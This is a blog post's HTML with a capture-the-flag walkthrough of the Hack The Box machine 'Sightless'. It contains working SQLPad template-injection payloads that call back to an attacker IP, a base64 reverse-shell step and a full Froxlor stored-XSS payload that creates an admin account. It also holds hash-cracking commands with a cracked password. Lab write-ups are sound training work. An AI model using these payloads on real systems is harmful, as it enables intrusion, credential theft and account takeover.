@@ -1,0 +1,193 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Sightless | foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Sightless</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2025-01-26T18:42:35.000Z" id="date"> 2025-01-26</time></div></span><br><span>Last Update: <div class="control"><time datetime="2025-03-03T23:34:38.957Z" id="updated"> 2025-03-03</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; flex-wrap: wrap; justify-content: center; align-items: center; gap: 20px;">
+
+  <!-- Image Section -->
+  <div style="flex: 1 1 auto; max-width: 300px; text-align: center;" class='item-img' data-src='sightless.png'><img src="sightless.png" title="Sightless" width="300px" height="300px" style="pointer-events: none; max-width: 100%; height: auto;">
+  </div>
+
+  <!-- Details Section -->
+  <div style="flex: 1 1 300px; display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS:</strong class='item-img' data-src='linux.png'><img src="linux.png" alt="Linux" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">Linux</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Easy</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>EmSec</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>September 7, 2024</span>
+    </div>
+  </div>
+
+</div>
+
+<style>
+  @media (max-width: 600px) {
+    div[style*="display: flex; flex-wrap: wrap;"] {
+      flex-direction: column;
+      align-items: center;
+    }
+
+    div[style*="flex: 1 1 auto;"] {
+      max-width: 100%;
+      text-align: center;
+    }
+
+    div[style*="flex: 1 1 300px;"] {
+      flex: 1 1 auto;
+      max-width: 100%;
+    }
+  }
+</style>
+
+<h2 id="Video-Walkthrough"><a href="#Video-Walkthrough" class="headerlink" title="Video Walkthrough"></a>Video Walkthrough</h2><iframe width="560" height="315" src="https://www.youtube.com/embed/WXLx1BMrVaI?si=-GJzR-0EXuYpPYUH" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -p- 10.10.11.32 -o initial_scan<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-13 13:38 WEST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.32<br>Host is up (0.041s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp<br>| fingerprint-strings: <br>|   GenericLines: <br>|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]<br>|     Invalid <span class="hljs-built_in">command</span>: try being more creative<br>|_    Invalid <span class="hljs-built_in">command</span>: try being more creative<br>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)<br>|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://sightless.htb/<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port21-TCP:V=7.94SVN%I=7%D=9/13%Time=66E43281%P=x86_64-pc-linux-gnu%r(G<br>SF:enericLines,A0,<span class="hljs-string">&quot;220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x20</span><br><span class="hljs-string">SF:Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x20</span><br><span class="hljs-string">SF:try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x</span><br><span class="hljs-string">SF:20being\x20more\x20creative\r\n&quot;</span>);<br>No exact OS matches <span class="hljs-keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.94SVN%E=4%D=9/13%OT=21%CT=1%CU=31944%PV=Y%DS=2%DC=T%G=Y%TM=66E4<br>OS:32C4%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)<br>OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C<br>OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)<br>OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%<br>OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T<br>OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=<br>OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF<br>OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40<br>OS:%CD=S)<br><br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE (using port 256/tcp)<br>HOP RTT      ADDRESS<br>1   41.34 ms 10.10.14.1<br>2   41.43 ms 10.10.11.32<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 97.89 seconds<br><br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">Port</th>
+<th align="center">Service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">21</td>
+<td align="center">FTP</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td align="center">SSH</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td align="center">HTTP</td>
+</tr>
+</tbody></table>
+<h3 id="HTTP-Page"><a href="#HTTP-Page" class="headerlink" title="HTTP Page"></a>HTTP Page</h3><p>Heading to the http page, we can find a SQLPad service.<br class='item-img' data-src='/HTB/Sightless/services.png'><img src="/HTB/Sightless/services.png"></p>
+<p>Add sqlpad.sightless.htb to &#x2F;etc&#x2F;hosts and access the service.<br class='item-img' data-src='/HTB/Sightless/sqlpad.png'><img src="/HTB/Sightless/sqlpad.png"></p>
+<h2 id="FootHold"><a href="#FootHold" class="headerlink" title="FootHold"></a>FootHold</h2><h3 id="SQLPAD-Template-Injection-RCE"><a href="#SQLPAD-Template-Injection-RCE" class="headerlink" title="SQLPAD Template Injection RCE"></a>SQLPAD Template Injection RCE</h3><p>After some googling, we can find this <a target="_blank" rel="noopener" href="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb">Template Injection RCE</a><br class='item-img' data-src='/HTB/Sightless/huntr.png'><img src="/HTB/Sightless/huntr.png"></p>
+<p>To test RCE, let’s first create a new connection, and attempt to callback to our machine.<br>Add a connection, select MySQL as the Driver, and add the following payload in the Database field.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&#123; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;wget http://&lt;IP&gt;:1234/pwn&#x27;) &#125;&#125;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/sqlpadcallback.png'><img src="/HTB/Sightless/sqlpadcallback.png"></p>
+<p>Now start a http server on your machine</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 1234<br></code></pre></td></tr></table></figure>
+
+<p>If we now test the connection, we will get a callback on our machine, confirming RCE.<br class='item-img' data-src='/HTB/Sightless/callbackconfirm.png'><img src="/HTB/Sightless/callbackconfirm.png"></p>
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>To get our first reverse shell, we just need to change the command to a reverse shell, I had problems using a normal reverse shell, so I had to encode it in base64 first.<br class='item-img' data-src='/HTB/Sightless/revshellbase64.png'><img src="/HTB/Sightless/revshellbase64.png"></p>
+<p>Now add a new connection, select MySQL as the Driver again, and add the following payload to the Database field.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&#123; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;echo &quot;&lt;base64 revshell&gt;&quot; | base64 -d | bash&#x27;) &#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Also start a listener on your machine.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 1337<br></code></pre></td></tr></table></figure>
+
+<p>If we test the connection now, we pop a shell.<br class='item-img' data-src='/HTB/Sightless/revshell.png'><img src="/HTB/Sightless/revshell.png"></p>
+<h3 id="Michael-User"><a href="#Michael-User" class="headerlink" title="Michael User"></a>Michael User</h3><p>If we notice, we have a shell as a root user, we are in a docker container.<br>Since we are root, we can take a look at the &#x2F;etc&#x2F;shadow file, which has a hash for the michael user.<br class='item-img' data-src='/HTB/Sightless/shadow.png'><img src="/HTB/Sightless/shadow.png"></p>
+<blockquote>
+<p>$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh&#x2F;pL2IJD&#x2F;</p>
+</blockquote>
+<p>Crack the hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 1800 michael.hash /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/hashcat.png'><img src="/HTB/Sightless/hashcat.png"></p>
+<p>We now have a user and password</p>
+<table>
+<thead>
+<tr>
+<th align="center">User</th>
+<th align="center">Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">michael</td>
+<td align="center">insaneclownposse</td>
+</tr>
+</tbody></table>
+<p>We can login through ssh with this password.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh michael@sightless.htb<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/sshmichael.png'><img src="/HTB/Sightless/sshmichael.png"></p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="FroxLor-CVE-2024-34070"><a href="#FroxLor-CVE-2024-34070" class="headerlink" title="FroxLor CVE-2024-34070"></a>FroxLor CVE-2024-34070</h3><p>Looking at the used ports in the machine, we can find the port 8080.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -tnlp<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/netstat.png'><img src="/HTB/Sightless/netstat.png"></p>
+<p>Port forward port 8080, in my case I used port 1234 since I use port 8080 for my Burp Suite proxy.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -L 1234:127.0.0.1:8080 michael@sightless.htb<br></code></pre></td></tr></table></figure>
+
+<p>Visiting the port forwarded page, we can see that it is being used for Froxlor.<br class='item-img' data-src='/HTB/Sightless/froxlor.png'><img src="/HTB/Sightless/froxlor.png"></p>
+<p>This instance of froxlor is vulnerable to <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2024-34070">CVE-2024-34070</a>.<br>We can follow the steps <a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-x525-54hf-xr53">here</a> to abuse a stored xss vulnerability.<br>This vulnerability allows an unauthenticated user to inject malicious scripts in the loginname parameter on the Login attempt, which will then be executed when viewed by the Administrator in the System Logs.</p>
+<p>Steps to reproduce:<br class='item-img' data-src='/HTB/Sightless/steps.png'><img src="/HTB/Sightless/steps.png"></p>
+<p>First step is to capture the login request.<br class='item-img' data-src='/HTB/Sightless/capture.png'><img src="/HTB/Sightless/capture.png"></p>
+<p>We will need to change the loginname parameter to the payload present in the previous github <a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-x525-54hf-xr53">link</a>.</p>
+<p>Original Payload:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs TEXT">admin&#123;&#123;$emit.constructor`function+b()&#123;var+metaTag%3ddocument.querySelector(&#x27;meta[name%3d&quot;csrf-token&quot;]&#x27;)%3bvar+csrfToken%3dmetaTag.getAttribute(&#x27;content&#x27;)%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d&quot;https%3a//demo.froxlor.org/admin_admins.php&quot;%3bvar+params%3d&quot;new_loginname%3dabcd%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d&quot;%2bcsrfToken%2b&quot;%26page%3dadmins%26action%3dadd%26send%3dsend&quot;%3bxhr.open(&quot;POST&quot;,url,true)%3bxhr.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;)%3balert(&quot;Your+Froxlor+Application+has+been+completely+Hacked&quot;)%3bxhr.send(params)&#125;%3ba%3db()`()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>URL Decode the payload and remove the “<a target="_blank" rel="noopener" href="https://demo.froxlor.org/">https://demo.froxlor.org</a>“ from the url parameter.<br>I also changed the username and password.<br class='item-img' data-src='/HTB/Sightless/newpayload.png'><img src="/HTB/Sightless/newpayload.png"></p>
+<p>Paste the edited payload in the loginname parameter, and URL encode it.<br class='item-img' data-src='/HTB/Sightless/request.png'><img src="/HTB/Sightless/request.png"></p>
+<p>We can now login with the new created user.<br class='item-img' data-src='/HTB/Sightless/dashboard.png'><img src="/HTB/Sightless/dashboard.png"></p>
+<h3 id="web1-FTP"><a href="#web1-FTP" class="headerlink" title="web1 FTP"></a>web1 FTP</h3><p>Looking at the traffic tab, we can find the username called “web1”, associated with FTP traffic.<br class='item-img' data-src='/HTB/Sightless/traffic.png'><img src="/HTB/Sightless/traffic.png"></p>
+<p>We can edit the user’s ftp account.<br>Click on the web1 user, and then FTP &gt; Accounts.<br class='item-img' data-src='/HTB/Sightless/web1account.png'><img src="/HTB/Sightless/web1account.png"></p>
+<p>Now just change the user’s FTP password.<br class='item-img' data-src='/HTB/Sightless/ftppassword.png'><img src="/HTB/Sightless/ftppassword.png"></p>
+<p>We can now access the ftp service.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lftp web1@10.10.11.32<br></code></pre></td></tr></table></figure>
+
+<p>If we try to list the current directory, we get an error from certificate validation, we can disable this with the following command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> ssl:verify-certificate <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/lftp.png'><img src="/HTB/Sightless/lftp.png"></p>
+<h3 id="KeePass-Database"><a href="#KeePass-Database" class="headerlink" title="KeePass Database"></a>KeePass Database</h3><p>We can find a file called Database.kdb in the &#x2F;goaccess&#x2F;backup directory.<br class='item-img' data-src='/HTB/Sightless/getdatabase.png'><img src="/HTB/Sightless/getdatabase.png"></p>
+<p>This is a KeePass Database file.<br>We can try accessing it with <a target="_blank" rel="noopener" href="https://github.com/rebkwok/kpcli">kpcli</a>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kpcli --kdb=Database.kdb<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/kpcli1.png'><img src="/HTB/Sightless/kpcli1.png"></p>
+<p>It requires a password to access.<br>We can use keepass2john, to attempt to crack the password with john.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">keepass2john Database.kdb &gt; keepass.hash<br>john keepass.hash -w=/usr/share/wordlists/rockyou.txt --format=KeePass<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/john.png'><img src="/HTB/Sightless/john.png"></p>
+<p>There is an entry in the Database called ssh in &#x2F;General&#x2F;sighless.htb&#x2F;Backup.<br class='item-img' data-src='/HTB/Sightless/sshkeepass.png'><img src="/HTB/Sightless/sshkeepass.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show -f ssh<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/showssh.png'><img src="/HTB/Sightless/showssh.png"></p>
+<p>This entry has a password and a private ssh key as an attachment.<br>Export the private key.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">attach ssh<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/exportkey.png'><img src="/HTB/Sightless/exportkey.png"></p>
+<p>If we attempt to login as root through ssh with this key, we get an error</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa<br>ssh root@sightless.htb -i id_rsa<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/ssherror.png'><img src="/HTB/Sightless/ssherror.png"></p>
+<p>Just use dos2unix and remove the extra space at the end to fix the formatting and use the key again.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dos2unix id_rsa<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Sightless/sshroot.png'><img src="/HTB/Sightless/sshroot.png"></p>
+<p>Rooted :)</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Cicada/">← Next [HTB] Cicada</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Bizness/">[HTB] Bizness Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'foguh' Ferreira</a></h1><div id="description"><p>SOC Analyst</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Video-Walkthrough"><span class="toc-number">1.</span> <span class="toc-text">Video Walkthrough</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">2.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Page"><span class="toc-number">2.2.</span> <span class="toc-text">HTTP Page</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FootHold"><span class="toc-number">3.</span> <span class="toc-text">FootHold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLPAD-Template-Injection-RCE"><span class="toc-number">3.1.</span> <span class="toc-text">SQLPAD Template Injection RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-Shell"><span class="toc-number">3.2.</span> <span class="toc-text">Reverse Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Michael-User"><span class="toc-number">3.3.</span> <span class="toc-text">Michael User</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FroxLor-CVE-2024-34070"><span class="toc-number">4.1.</span> <span class="toc-text">FroxLor CVE-2024-34070</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web1-FTP"><span class="toc-number">4.2.</span> <span class="toc-text">web1 FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KeePass-Database"><span class="toc-number">4.3.</span> <span class="toc-text">KeePass Database</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
